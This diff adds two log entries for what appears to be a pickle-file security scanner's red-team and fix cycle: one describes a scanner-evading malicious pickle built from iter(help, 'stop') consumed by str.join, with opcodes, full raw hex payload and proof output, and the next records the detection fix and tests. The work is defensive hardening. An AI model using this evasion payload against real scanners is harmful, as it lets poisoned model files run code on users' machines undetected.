@@ -15703,3 +15703,227 @@ Validation:
 - `mypy`: `Success: no issues found in 447 source files`.
 - Full non-slow/non-integration validation:
   `3759 passed, 1022 skipped, 21 warnings in 39.29s`.
+
+## Turn 251 - Bypass via unmodeled `str.join` call-iterator consumption
+
+Found another scanner-clean RCE-capable bypass in the finite iterable-consumer
+surface. The native model now tracks direct container constructors, selected
+built-in consumers, and lazy wrappers, but clean built-in method descriptors can
+also drain an iterable argument. The smallest representative is
+`builtins.str.join`.
+
+The payload constructs `iter(builtins.help, "stop")`, then invokes
+`builtins.str.join("", iterator)`. `str.join(...)` pulls from the iterator;
+`help()` runs once, enters `_sitebuiltins._Helper.__call__`, and imports
+`pydoc`. A shadow `pydoc.py` at the front of `sys.path` executes during
+`pickle.loads` and returns the sentinel, so the join sees an empty iterable and
+returns an empty string.
+
+Payload shape:
+
+```text
+PROTO 4
+STACK_GLOBAL builtins iter
+STACK_GLOBAL builtins help
+SHORT_BINUNICODE "stop"
+TUPLE2
+REDUCE              # iter(help, "stop")
+MEMOIZE
+POP
+STACK_GLOBAL builtins str.join
+MARK
+SHORT_BINUNICODE ""
+BINGET 0
+TUPLE
+REDUCE              # "".join(iter(help, "stop"))
+STOP
+```
+
+Raw payload:
+
+```text
+80048c086275696c74696e738c0469746572938c086275696c74696e738c0468656c70938c0473746f70865294308c086275696c74696e738c087374722e6a6f696e93288c00680074522e
+```
+
+Scanner proof:
+
+```text
+payload_len 75
+scan clean findings 0 errors ()
+imports [
+  ('builtins', 'iter', None, None),
+  ('builtins', 'help', None, None),
+  ('builtins', 'str.join', None, None),
+]
+invocations [
+  ('builtins', 'iter', 2, 43),
+  ('builtins', 'str.join', 2, 73),
+]
+```
+
+Runtime proof:
+
+```text
+runtime rc 0
+runtime_result ''
+runtime_type str
+runtime_len 0
+marker_exists True
+marker_text owned-by-str-join
+runtime stderr
+```
+
+Sibling probes:
+
+```text
+bytes len 69 scan clean findings 0
+invocations [
+  ('builtins', 'iter', 2, 43),
+  ('builtins', 'bytes', 1, 67),
+]
+
+bytearray len 73 scan clean findings 0
+invocations [
+  ('builtins', 'iter', 2, 43),
+  ('builtins', 'bytearray', 1, 71),
+]
+
+bytes.join len 77 scan clean findings 0
+invocations [
+  ('builtins', 'iter', 2, 43),
+  ('builtins', 'bytes.join', 2, 75),
+]
+```
+
+The `bytes`, `bytearray`, and `bytes.join` siblings also executed the shadow
+`pydoc.py` marker proof in child interpreters and returned empty byte-like
+objects.
+
+Why it bypasses:
+
+- Native policy does not mark `builtins.iter`, `builtins.help`,
+  `builtins.str.join`, `builtins.bytes`, `builtins.bytearray`, or
+  `builtins.bytes.join` as dangerous.
+- The stack model correctly tracks `iter(help, "stop")` as a
+  `StackValue::CallIterator`.
+- `call_iterator_consumption_invocations(...)` only models container
+  constructors, `collections.deque`, selected built-in consumers, and `next`.
+- It does not model built-in byte/text constructors or join descriptors that
+  consume an iterable argument, so no synthetic zero-argument `builtins.help`
+  invocation is emitted.
+- The Python call graph already knows an invoked `builtins.help()` reaches
+  `_sitebuiltins._Helper.__call__ -> builtins.__import__`, but that path is
+  never considered because native metadata only records the clean `str.join`
+  invocation.
+- The payload contains no `pydoc`, `import`, `__import__`, `eval`, `exec`,
+  `os.system`, or `subprocess` strings.
+
+Likely source-level defense:
+
+- Extend call-iterator consumption modeling for clean built-in byte/text
+  consumers.
+- Add one-argument `builtins.bytes(call_iterator)` and
+  `builtins.bytearray(call_iterator)` to the eager-consumer set.
+- Add method-descriptor consumers where the iterable argument is not first:
+  `builtins.str.join(separator, call_iterator)` and
+  `builtins.bytes.join(separator, call_iterator)`. `builtins.bytearray.join`
+  should be handled the same way when the receiver operand is a bytearray.
+- Keep the defense stack-local and arity-specific, reusing the existing
+  synthetic zero-argument invocation path for the stored call-iterator callable.
+
+Performance note:
+
+- Payload size is 75 bytes.
+- Warm scan median over 1000 runs was `0.000055s`, p95 `0.000066s`, and max
+  `0.000144s`.
+- A fix only needs to inspect the already-decoded reducer arguments for a small
+  set of built-in byte/text iterable consumers.
+
+## Turn 252 - Defense for byte/text call-iterator consumers
+
+Blocked the Turn 251 `str.join(iter(help, "stop"))` bypass at the native
+call-iterator consumer source. The fix keeps the same call-graph strategy:
+identify clean built-in consumers that drain a tracked call iterator and emit a
+synthetic zero-argument invocation for the stored callable.
+
+Implementation:
+
+- Added one-argument `builtins.bytes(call_iterator)` and
+  `builtins.bytearray(call_iterator)` to the built-in iterable consumer model.
+- Added join-descriptor consumers where the iterable argument is second:
+  `builtins.str.join(separator, call_iterator)`,
+  `builtins.bytes.join(separator, call_iterator)`, and
+  `builtins.bytearray.join(bytearray_separator, call_iterator)`.
+- Receiver checks stay type-aware using the existing tracked stack values:
+  text-like operands for `str.join`, byte operands or constructed `bytes` for
+  `bytes.join`, and constructed `bytearray` for `bytearray.join`.
+- The detection still emits only the stored call-iterator callable as a
+  synthetic zero-argument invocation, so the existing Python call graph handles
+  `builtins.help -> _sitebuiltins._Helper.__call__ -> builtins.__import__`.
+
+Regression coverage:
+
+- Extended the built-in iterable consumer regression with `bytes` and
+  `bytearray`.
+- Added `str.join` and `bytes.join` call-iterator regressions.
+- Added a valid `bytearray.join` regression that first constructs a
+  `bytearray(b"")` receiver, then consumes the call iterator.
+- Each case verifies lazy call-iterator construction remains clean, the
+  consuming payload is malicious, the report includes a hidden zero-argument
+  `builtins.help` invocation, and a child interpreter writes the shadow
+  `pydoc.py` marker during `pickle.loads`.
+
+Post-fix proof for the exact Turn 251 payload:
+
+```text
+payload_len 75
+scan malicious findings 1 errors ()
+dangerous [('_sitebuiltins', '_Helper.__call__', 'builtins.__import__')]
+imports [
+  ('builtins', 'iter', None, None),
+  ('builtins', 'help', None, None),
+  ('builtins', 'str.join', None, None),
+]
+invocations [
+  ('builtins', 'iter', 2, 43),
+  ('builtins', 'str.join', 2, 73),
+  ('builtins', 'help', 0, 73),
+]
+runtime rc 0
+runtime_result ''
+runtime_type str
+runtime_len 0
+marker_exists True
+marker_text owned-by-str-join
+runtime stderr
+timing_median 0.000119
+timing_p95 0.000128
+timing_max 0.000291
+```
+
+Performance note:
+
+- The new checks are stack-local and arity-specific.
+- The join path inspects only the two already-decoded reducer arguments and
+  does not add payload scanning, imports, or broader call-graph traversal.
+- Warm median for the fixed 75-byte payload was `0.000119s` over 1000 runs.
+
+Validation:
+
+- Rust formatting:
+  `cargo fmt --manifest-path packages/modelaudit-picklescan/Cargo.toml`.
+- Rust unit tests: `78 passed`.
+- Rebuilt the local ignored extension with release `cargo build` plus macOS
+  dynamic-lookup linker flags, then copied it to
+  `packages/modelaudit-picklescan/src/modelaudit_picklescan/_rust.abi3.so` for
+  Python tests.
+- Focused byte/text consumer regressions: `10 passed in 0.57s`.
+- Focused import/call-graph regression file: `49 passed in 1.68s`.
+- Focused call-graph suite: `87 passed in 3.60s`.
+- Focused `click.utils.LazyFile` startup-hook regression: `1 passed in
+  1.34s`.
+- `ruff format`: `392 files left unchanged`.
+- `ruff check --fix`: `All checks passed!`.
+- `mypy`: `Success: no issues found in 447 source files`.
+- Full non-slow/non-integration validation:
+  `3764 passed, 1022 skipped, 21 warnings in 37.61s`.
